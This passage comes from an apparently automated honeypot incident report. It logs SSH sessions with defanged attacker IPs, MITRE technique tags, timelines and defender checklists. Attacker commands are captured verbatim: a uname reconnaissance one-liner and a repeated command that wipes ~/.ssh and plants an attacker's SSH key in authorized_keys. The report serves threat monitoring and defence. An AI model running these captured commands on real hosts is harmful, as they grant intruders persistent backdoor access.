| **Last Seen** | 2026-08-11 12:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 12:59:48` | `cowrie.session.connect` |
| `2026-08-11 12:59:48` | `cowrie.client.version` |
| `2026-08-11 12:59:48` | `cowrie.client.kex` |
| `2026-08-11 12:59:49` | `cowrie.login.success` |
| `2026-08-11 12:59:50` | `cowrie.session.params` |
| `2026-08-11 12:59:50` | `cowrie.command.input` |
| `2026-08-11 12:59:50` | `cowrie.command.input` |
| `2026-08-11 12:59:50` | `cowrie.command.input` |
| `2026-08-11 12:59:50` | `cowrie.command.input` |
| `2026-08-11 12:59:50` | `cowrie.command.input` |
| `2026-08-11 12:59:50` | `cowrie.command.success` |
| `2026-08-11 12:59:50` | `cowrie.command.input` |
| `2026-08-11 12:59:50` | `cowrie.command.input` |
| `2026-08-11 12:59:50` | `cowrie.command.input` |
| `2026-08-11 12:59:50` | `cowrie.command.input` |
| `2026-08-11 12:59:50` | `cowrie.log.closed` |
| `2026-08-11 12:59:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3dfdc50b6a4

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-08-11 13:01 |
| **Last Seen** | 2026-08-11 13:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:01:10` | `cowrie.session.connect` |
| `2026-08-11 13:01:10` | `cowrie.client.version` |
| `2026-08-11 13:01:10` | `cowrie.client.kex` |
| `2026-08-11 13:01:10` | `cowrie.login.success` |
| `2026-08-11 13:01:11` | `cowrie.session.params` |
| `2026-08-11 13:01:11` | `cowrie.command.input` |
| `2026-08-11 13:01:11` | `cowrie.log.closed` |
| `2026-08-11 13:01:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1480c9f039ba

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-11 13:01 |
| **Last Seen** | 2026-08-11 13:01 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:01:51` | `cowrie.session.connect` |
| `2026-08-11 13:01:51` | `cowrie.client.version` |
| `2026-08-11 13:01:51` | `cowrie.client.kex` |
| `2026-08-11 13:01:52` | `cowrie.login.success` |
| `2026-08-11 13:01:54` | `cowrie.session.params` |
| `2026-08-11 13:01:54` | `cowrie.command.input` |
| `2026-08-11 13:01:54` | `cowrie.command.input` |
| `2026-08-11 13:01:54` | `cowrie.command.input` |
| `2026-08-11 13:01:54` | `cowrie.command.input` |
| `2026-08-11 13:01:54` | `cowrie.command.input` |
| `2026-08-11 13:01:54` | `cowrie.command.success` |
| `2026-08-11 13:01:54` | `cowrie.command.input` |
| `2026-08-11 13:01:54` | `cowrie.command.input` |
| `2026-08-11 13:01:54` | `cowrie.command.input` |
| `2026-08-11 13:01:54` | `cowrie.command.input` |
| `2026-08-11 13:01:55` | `cowrie.log.closed` |
| `2026-08-11 13:01:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9235085c2c70

| Field | Detail |
|---|---|
| **Source IP** | `111.70.32[.]2` |
| **First Seen** | 2026-08-11 13:03 |
| **Last Seen** | 2026-08-11 13:03 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:03:14` | `cowrie.session.connect` |
| `2026-08-11 13:03:14` | `cowrie.client.version` |
| `2026-08-11 13:03:14` | `cowrie.client.kex` |
| `2026-08-11 13:03:16` | `cowrie.login.success` |
| `2026-08-11 13:03:17` | `cowrie.direct-tcpip.request` |
| `2026-08-11 13:03:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.32[.]2` to AbuseIPDB if not already reported
- [ ] Block `111.70.32[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e9f586d7fdd

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-11 13:03 |
| **Last Seen** | 2026-08-11 13:03 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:03:43` | `cowrie.session.connect` |
| `2026-08-11 13:03:43` | `cowrie.client.version` |
| `2026-08-11 13:03:43` | `cowrie.client.kex` |
| `2026-08-11 13:03:45` | `cowrie.login.success` |
| `2026-08-11 13:03:47` | `cowrie.session.params` |
| `2026-08-11 13:03:47` | `cowrie.command.input` |
| `2026-08-11 13:03:47` | `cowrie.command.input` |
| `2026-08-11 13:03:47` | `cowrie.command.input` |
| `2026-08-11 13:03:47` | `cowrie.command.input` |
| `2026-08-11 13:03:47` | `cowrie.command.input` |
| `2026-08-11 13:03:47` | `cowrie.command.success` |
| `2026-08-11 13:03:47` | `cowrie.command.input` |
| `2026-08-11 13:03:47` | `cowrie.command.input` |
| `2026-08-11 13:03:47` | `cowrie.command.input` |
| `2026-08-11 13:03:47` | `cowrie.command.input` |
| `2026-08-11 13:03:47` | `cowrie.log.closed` |
| `2026-08-11 13:03:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce904334dbcc

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-08-11 13:03 |
| **Last Seen** | 2026-08-11 13:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:03:57` | `cowrie.session.connect` |
| `2026-08-11 13:03:57` | `cowrie.client.version` |
| `2026-08-11 13:03:57` | `cowrie.client.kex` |
| `2026-08-11 13:03:57` | `cowrie.login.success` |
| `2026-08-11 13:03:58` | `cowrie.session.params` |
| `2026-08-11 13:03:58` | `cowrie.command.input` |
| `2026-08-11 13:03:58` | `cowrie.log.closed` |
| `2026-08-11 13:03:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48dd38c87b38

| Field | Detail |
|---|---|
| **Source IP** | `163.7.1[.]156` |
| **First Seen** | 2026-08-11 13:04 |
| **Last Seen** | 2026-08-11 13:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:04:01` | `cowrie.session.connect` |
| `2026-08-11 13:04:02` | `cowrie.telnet.option` |
| `2026-08-11 13:04:03` | `cowrie.telnet.option` |
| `2026-08-11 13:05:03` | `cowrie.login.success` |
| `2026-08-11 13:05:04` | `cowrie.session.params` |

**Recommended Actions:**
- [ ] Submit `163.7.1[.]156` to AbuseIPDB if not already reported
- [ ] Block `163.7.1[.]156` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fb1efb1cdd0

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-11 13:05 |
| **Last Seen** | 2026-08-11 13:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:05:32` | `cowrie.session.connect` |
| `2026-08-11 13:05:33` | `cowrie.client.version` |
| `2026-08-11 13:05:33` | `cowrie.client.kex` |
| `2026-08-11 13:05:34` | `cowrie.login.success` |
| `2026-08-11 13:05:36` | `cowrie.session.params` |
| `2026-08-11 13:05:36` | `cowrie.command.input` |
| `2026-08-11 13:05:36` | `cowrie.command.input` |
| `2026-08-11 13:05:36` | `cowrie.command.input` |
| `2026-08-11 13:05:36` | `cowrie.command.input` |
| `2026-08-11 13:05:36` | `cowrie.command.input` |
| `2026-08-11 13:05:36` | `cowrie.command.success` |
| `2026-08-11 13:05:36` | `cowrie.command.input` |
| `2026-08-11 13:05:36` | `cowrie.command.input` |
| `2026-08-11 13:05:36` | `cowrie.command.input` |
| `2026-08-11 13:05:36` | `cowrie.command.input` |
| `2026-08-11 13:05:37` | `cowrie.log.closed` |
| `2026-08-11 13:05:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81799cbccf39

| Field | Detail |
|---|---|
| **Source IP** | `37.187.244[.]59` |
| **First Seen** | 2026-08-11 13:06 |
| **Last Seen** | 2026-08-11 13:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:06:18` | `cowrie.session.connect` |
| `2026-08-11 13:06:18` | `cowrie.client.version` |
| `2026-08-11 13:06:18` | `cowrie.client.kex` |
| `2026-08-11 13:06:19` | `cowrie.login.success` |
| `2026-08-11 13:06:19` | `cowrie.session.params` |
| `2026-08-11 13:06:19` | `cowrie.command.input` |
| `2026-08-11 13:06:19` | `cowrie.command.failed` |
| `2026-08-11 13:06:20` | `cowrie.log.closed` |
| `2026-08-11 13:06:20` | `cowrie.session.params` |
| `2026-08-11 13:06:20` | `cowrie.command.input` |
| `2026-08-11 13:06:21` | `cowrie.session.file_download` |
| `2026-08-11 13:06:21` | `cowrie.log.closed` |
| `2026-08-11 13:06:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.187.244[.]59` to AbuseIPDB if not already reported
- [ ] Block `37.187.244[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a3d5dbb15ef

| Field | Detail |
|---|---|
| **Source IP** | `37.187.244[.]59` |
| **First Seen** | 2026-08-11 13:06 |
| **Last Seen** | 2026-08-11 13:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:06:21` | `cowrie.session.connect` |
| `2026-08-11 13:06:21` | `cowrie.client.version` |
| `2026-08-11 13:06:21` | `cowrie.client.kex` |
| `2026-08-11 13:06:21` | `cowrie.login.success` |
| `2026-08-11 13:06:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.187.244[.]59` to AbuseIPDB if not already reported
- [ ] Block `37.187.244[.]59` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e6229e1d769

| Field | Detail |
|---|---|
| **Source IP** | `37.187.244[.]59` |
| **First Seen** | 2026-08-11 13:06 |
| **Last Seen** | 2026-08-11 13:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:06:21` | `cowrie.session.connect` |
| `2026-08-11 13:06:21` | `cowrie.client.version` |
| `2026-08-11 13:06:21` | `cowrie.client.kex` |
| `2026-08-11 13:06:22` | `cowrie.login.success` |
| `2026-08-11 13:06:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.187.244[.]59` to AbuseIPDB if not already reported
- [ ] Block `37.187.244[.]59` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da4b7faee762

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-08-11 13:06 |
| **Last Seen** | 2026-08-11 13:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:06:47` | `cowrie.session.connect` |
| `2026-08-11 13:06:47` | `cowrie.client.version` |
| `2026-08-11 13:06:47` | `cowrie.client.kex` |
| `2026-08-11 13:06:47` | `cowrie.login.success` |
| `2026-08-11 13:06:48` | `cowrie.session.params` |
| `2026-08-11 13:06:48` | `cowrie.command.input` |
| `2026-08-11 13:06:48` | `cowrie.log.closed` |
| `2026-08-11 13:06:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5fdf123eaf02

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-11 13:07 |
| **Last Seen** | 2026-08-11 13:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:07:21` | `cowrie.session.connect` |
| `2026-08-11 13:07:21` | `cowrie.client.version` |
| `2026-08-11 13:07:21` | `cowrie.client.kex` |
| `2026-08-11 13:07:22` | `cowrie.login.success` |
| `2026-08-11 13:07:23` | `cowrie.session.params` |
| `2026-08-11 13:07:23` | `cowrie.command.input` |
| `2026-08-11 13:07:23` | `cowrie.command.input` |
| `2026-08-11 13:07:23` | `cowrie.command.input` |
| `2026-08-11 13:07:23` | `cowrie.command.input` |
| `2026-08-11 13:07:23` | `cowrie.command.input` |
| `2026-08-11 13:07:23` | `cowrie.command.success` |
| `2026-08-11 13:07:23` | `cowrie.command.input` |
| `2026-08-11 13:07:23` | `cowrie.command.input` |
| `2026-08-11 13:07:23` | `cowrie.command.input` |
| `2026-08-11 13:07:23` | `cowrie.command.input` |
| `2026-08-11 13:07:24` | `cowrie.log.closed` |
| `2026-08-11 13:07:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-363c822c7ea5

| Field | Detail |
|---|---|
| **Source IP** | `200.232.114[.]71` |
| **First Seen** | 2026-08-11 13:08 |
| **Last Seen** | 2026-08-11 13:08 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:08:43` | `cowrie.session.connect` |
| `2026-08-11 13:08:43` | `cowrie.client.version` |
| `2026-08-11 13:08:43` | `cowrie.client.kex` |
| `2026-08-11 13:08:45` | `cowrie.login.success` |
| `2026-08-11 13:08:46` | `cowrie.direct-tcpip.request` |
| `2026-08-11 13:08:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.232.114[.]71` to AbuseIPDB if not already reported
- [ ] Block `200.232.114[.]71` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b0f6dafffdf

| Field | Detail |
|---|---|
| **Source IP** | `168.144.134[.]137` |
| **First Seen** | 2026-08-11 13:08 |
| **Last Seen** | 2026-08-11 13:08 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:08:45` | `cowrie.session.connect` |
| `2026-08-11 13:08:45` | `cowrie.client.version` |
| `2026-08-11 13:08:45` | `cowrie.client.kex` |
| `2026-08-11 13:08:46` | `cowrie.login.success` |
| `2026-08-11 13:08:48` | `cowrie.session.params` |
| `2026-08-11 13:08:48` | `cowrie.command.input` |
| `2026-08-11 13:08:48` | `cowrie.command.failed` |
| `2026-08-11 13:08:48` | `cowrie.log.closed` |
| `2026-08-11 13:08:49` | `cowrie.session.params` |
| `2026-08-11 13:08:49` | `cowrie.command.input` |
| `2026-08-11 13:08:49` | `cowrie.session.file_download` |
| `2026-08-11 13:08:49` | `cowrie.log.closed` |
| `2026-08-11 13:08:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.144.134[.]137` to AbuseIPDB if not already reported
- [ ] Block `168.144.134[.]137` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9337769cf27

| Field | Detail |
|---|---|
| **Source IP** | `168.144.134[.]137` |
| **First Seen** | 2026-08-11 13:08 |
| **Last Seen** | 2026-08-11 13:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:08:50` | `cowrie.session.connect` |
| `2026-08-11 13:08:50` | `cowrie.client.version` |
| `2026-08-11 13:08:50` | `cowrie.client.kex` |
| `2026-08-11 13:08:51` | `cowrie.login.success` |
| `2026-08-11 13:08:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.144.134[.]137` to AbuseIPDB if not already reported
- [ ] Block `168.144.134[.]137` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-400cad1282e0

| Field | Detail |
|---|---|
| **Source IP** | `200.232.114[.]71` |
| **First Seen** | 2026-08-11 13:08 |
| **Last Seen** | 2026-08-11 13:08 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:08:51` | `cowrie.session.connect` |
| `2026-08-11 13:08:51` | `cowrie.client.version` |
| `2026-08-11 13:08:51` | `cowrie.client.kex` |
| `2026-08-11 13:08:53` | `cowrie.login.success` |
| `2026-08-11 13:08:54` | `cowrie.direct-tcpip.request` |
| `2026-08-11 13:08:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.232.114[.]71` to AbuseIPDB if not already reported
- [ ] Block `200.232.114[.]71` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d38bd4b2af62

| Field | Detail |
|---|---|
| **Source IP** | `168.144.134[.]137` |
| **First Seen** | 2026-08-11 13:08 |
| **Last Seen** | 2026-08-11 13:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:08:51` | `cowrie.session.connect` |
| `2026-08-11 13:08:51` | `cowrie.client.version` |
| `2026-08-11 13:08:52` | `cowrie.client.kex` |
| `2026-08-11 13:08:53` | `cowrie.login.success` |
| `2026-08-11 13:08:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.144.134[.]137` to AbuseIPDB if not already reported
- [ ] Block `168.144.134[.]137` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-381dde09db06

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-11 13:09 |
| **Last Seen** | 2026-08-11 13:09 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
